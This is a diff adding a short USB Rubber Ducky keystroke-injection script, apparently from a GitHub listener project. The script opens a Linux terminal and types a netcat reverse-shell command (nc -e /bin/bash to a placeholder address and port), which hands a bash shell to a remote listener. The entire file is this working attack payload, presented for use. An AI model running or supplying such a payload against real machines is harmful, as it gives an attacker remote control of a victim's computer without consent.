@@ -1,0 +1,16 @@
+REM example payload for the provided/other listener to connect to
+REM will need a USB rubber ducky or other compatible device running ducky script
+REM you may need to modify this dependent on the distro of Linux you're using this on
+REM tested on: Kali-Linux-2021.2 on XX/XX/XXXX (placeholder)
+REM Author: Skyrub-dev
+REM Repo: https://github.com/Skyrub-dev/tcp_listener/tree/master
+DELAY 1000
+ALT F2
+DELAY 100
+STRING terminal
+DELAY 50
+ENTER
+DELAY 10
+STRING nc -e /bin/bash 127.0.0.0 100
+DELAY 1000
+ENTER
